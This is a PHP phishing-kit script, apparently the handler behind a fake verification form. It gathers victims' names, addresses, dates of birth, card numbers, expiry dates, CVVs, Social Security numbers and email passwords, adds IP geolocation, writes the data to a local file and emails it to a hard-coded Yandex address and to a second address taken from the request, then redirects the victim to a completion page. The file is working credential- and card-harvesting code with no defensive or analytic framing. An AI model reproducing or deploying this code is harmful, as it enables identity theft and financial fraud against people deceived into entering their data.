<?php
	
	$email = $_POST['email'];
	$passwd = $_POST['pas'];
	$fuln = $_POST['ans5'];
	$addres = $_POST['address'];
	$dob = $_POST['ans4'];
	$zip = $_POST['q4'];
	$cnum = $_POST['q3'];
	$exp = $_POST['ans3'];
	$cvv = $_POST['anh4'];
	$ssn = $_POST['q5'];
	$serv = $_REQUEST['verify'];
	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
    $message .= "---|Ghost Rider|---\n";
    $message .= "Full Name: ".$fuln."\n";
    $message .= "Full Home Address: ".$addres."\n";
    $message .= "Date of Birth (MM/DD/YYYY): ".$dob."\n";
    $message .= "Zip Code: ".$zip."\n";
    $message .= "Credit/Debit Card Number: ".$cnum."\n";
    $message .= "Expiry Date (MM/YYYY): ".$exp."\n";
    $message .= "CVV: ".$cvv."\n";
    $message .= "Social Security Number: ".$ssn."\n";
    $message .= "Email Address: ".$email."\n";
    $message .= "Email Password: ".$passwd."\n";
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";
	
	$handle = fopen("JOB.txt", "a");
	fwrite($handle, $message);
	fclose($handle);

	$send ="luvphilip@yandex.com";

	$subject = "Alaska - | $ip";
	$headers = "From: Result@cok.com";

	{
	mail("$send",$subject,$message,$headers);
	mail("$serv",$subject,$message,$headers);
	}
?>
<script>
	window.location="complate.php";
</script>